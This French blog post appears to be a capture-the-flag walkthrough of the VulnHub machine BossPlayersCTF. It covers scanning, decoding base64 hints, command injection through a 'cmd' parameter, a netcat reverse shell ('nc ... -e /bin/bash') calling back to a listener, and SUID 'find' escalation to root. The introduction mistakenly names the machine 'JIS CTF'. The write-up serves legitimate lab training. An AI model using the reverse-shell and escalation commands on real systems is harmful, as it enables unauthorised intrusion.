---
layout: post
title: VulnHub - BossPlayersCTF
subtitle: VulnHub - Linux Machine - Easy 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [VulnHub, Find]
comments: false
---

![Logo](/img/Vulnhub_logo.png){: .center-block :}

JIS CTF est une machine vulnérable créée par Cuong Nguyen et disponible depuis septembre 2019 en téléchargement sur [VulnHub](https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/). Elle est également proposée sur la plateforme d'[Offensive Security](https://www.offensive-security.com/labs/individual/).

## 1. User

Nmap:

~~~
root@Host-001:~/Bureau/OSCP_Box/BossPlayersCTF# nmap -sC -sV 192.168.185.20
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-15 11:56 CET
Nmap scan report for 192.168.185.20
Host is up (0.10s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:0d:1e:71:40:ef:6e:65:91:95:8d:1c:13:13:8e:3e (RSA)
|   256 24:9e:27:18:df:a4:78:3b:0d:11:8a:92:72:bd:05:8d (ECDSA)
|_  256 26:32:8d:73:89:05:29:43:8e:a1:13:ba:4f:83:53:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.17 seconds
~~~

Les ports http (80) et ssh (22) sont ouverts.

Port 80:

![Logo](/img/Boss_1.png){: .center-block :}

Robots.txt:

![Logo](/img/Boss_2.png){: .center-block :}

`super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg==`

~~~
root@Host-001:~/Bureau/OSCP_Box/BossPlayersCTF# echo 'bG9sIHRyeSBoYXJkZXIgYnJvCg==' | base64 -d
lol try harder bro
root@Host-001:~/Bureau/OSCP_Box/BossPlayersCTF# 
~~~

Le code source donne rien a premiere vue. Dirb ne donne aucun résultat

retour au code source, défiler jusqu'en bas:

![Logo](/img/Boss_3.png){: .center-block :}

~~~
root@Host-001:~/Bureau/OSCP_Box/BossPlayersCTF# echo 'WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK' | base64 -d
ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K
root@Host-001:~/Bureau/OSCP_Box/BossPlayersCTF# echo 'WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK' | base64 -d | base64 -d
d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==
root@Host-001:~/Bureau/OSCP_Box/BossPlayersCTF# echo 'WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK' | base64 -d | base64 -d | base64 -d
workinginprogress.php
root@Host-001:~/Bureau/OSCP_Box/BossPlayersCTF# 
~~~

workinginprogress.php

![Logo](/img/Boss_4.png){: .center-block :}

ping command = ping argument ?

![Logo](/img/Boss_5.png){: .center-block :}

NOPE ! cmd argument ?

![Logo](/img/Boss_6.png){: .center-block :}

Oooo on peut lancer des commandes ! nc ?

Ref: [0xSs0rZ - GitBook](https://0xss0rz.gitbook.io/0xss0rz/pentest-htb/web-1/shell-reverse-shell#netcat-reverse-shell)

lancer un listener sur le port 1337 et visiter http://192.168.185.20/workinginprogress.php?cmd=nc%20192.168.49.185%201337%20-e%20/bin/bash

uploader LinEnum et le lancer. On trouve

![Logo](/img/Boss_7.png){: .center-block :}

Find SUID - GTFOBins: [https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/)

`find . -exec /bin/sh -p \; -quit`

![Logo](/img/Boss_8.png){: .center-block :}

~~~
www-data@bossplayers:/tmp$ ffiinndd  ..//  --eexxeecc  //bbiin/ban/bsashh  --pp  \\;;

bash-5.0# iiss

bash: is: command not found
bash-5.0# iidd

uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-5.0# ccdd  //rroootot

bash-5.0# lsls

proof.txt  root.txt
bash-5.0# ccaatt  rroooott..ttxxtt

Your flag is in another file...
bash-5.0# ccaatt  pprrooooff..ttxxtt

07461c1b296dc93f559fdc0ec472838e
bash-5.0# 
~~~

**Poursuivez avec :** 

[- VulnHub - JIS CTF](https://0xss0rz.github.io/2020-11-16-VulnHub-JISCTF/)

[- HTB - Admirer](https://0xss0rz.github.io/2020-10-04-HTB-Admirer/)

[- HTB - Magic](https://0xss0rz.github.io/2020-08-24-HTB-Magic/)

[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
